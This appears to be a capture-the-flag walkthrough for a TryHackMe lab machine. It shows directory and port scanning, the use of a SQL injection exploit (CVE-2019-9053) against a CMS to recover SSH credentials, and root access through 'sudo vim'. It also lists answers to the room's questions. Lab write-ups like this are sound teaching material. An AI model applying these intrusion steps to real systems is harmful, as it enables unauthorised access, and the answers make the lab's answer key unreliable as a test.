# [SimpleCTF-THM]()

Deploy the machine and attempt the questions!

---------

# Scanning Steps :

## STEP 1 :

**APACHE SETUP SOURCE CODE**

Found **robots.txt**

```html
User-agent: *
Disallow: /


Disallow: /openemr-5_0_1_3 
```

Scanning Paths

```bash
gobuster -u $IP -w .txt

2022/02/23 18:06:06 Starting gobuster
=====================================================
/simple (Status: 301)
```

Found **SIMPLE** **CMS**

Rescanning

```bash
gobuster -u $IP/simple -w .txt

/admin (Status: 301)
/assets (Status: 301)
/doc (Status: 301)
/lib (Status: 301)
/modules (Status: 301)
/tmp (Status: 301)
/uploads (Status: 301)
```

Found **Admin** path **301**


## STEP 2 :

Scanning Open Ports

```bash
nmap -sC -sV $IP


Starting Nmap 7.80 ( https://nmap.org ) at 2022-02-23 18:08 CET
Nmap scan report for 10.10.109.159
Host is up (0.092s latency).
Not shown: 65533 filtered ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.8.52.185
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 2 disallowed entries 
|_/ /openemr-5_0_1_3 
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Unix
```
Found open ports :

**FTP 21 is Open.**

**SSH 2222 is Open**

**HTTP 80**

1) How many services are running under port 1000?

**TCP/UDP - 2**



2) What is running on the higher port?

**SSH** Port **2222**

---------

# Exploiting Steps :

Found **[SQL injection](https://www.exploit-db.com/exploits/46635)** on the **Simple CMS**
in **Exploit-db**

## STEP 1 :

Using exploit script 

```bash
exploit.py -u $IP -w x.txt 
Found Username : mitch
Found Password : secret
```

3) What's the CVE you're using against the application? 

**[CVE-2019-9053](https://www.exploit-db.com/exploits/46635)**

4) To what kind of vulnerability is the application vulnerable?

**sqli**

5) What's the password?

**secret**

6) Where can you login with the details obtained?

**SSH**

## STEP 1 :

Connecting to **SSH**

```bash
ssh mitch@$IP -p 2222
password :

$ cd /home
$ ls

mitch sunpath

$ cd mitch
$ ls
user.txt
```

7) Is there any other user in the home directory? What's its name?

**sunpath**

**FOUND USER FLAG**

## STEP 2 :

Accessing as **ROOT**

```bash
$ sudo -l

can access
WITHPASSWD vim
```



8) What can you leverage to spawn a privileged shell?

**vim**

```bash
$ sudo vim -c '!bash'
password :

# whoami
root
# cd /root
# ls
root.txt
```

**FOUND ROOT FLAG**
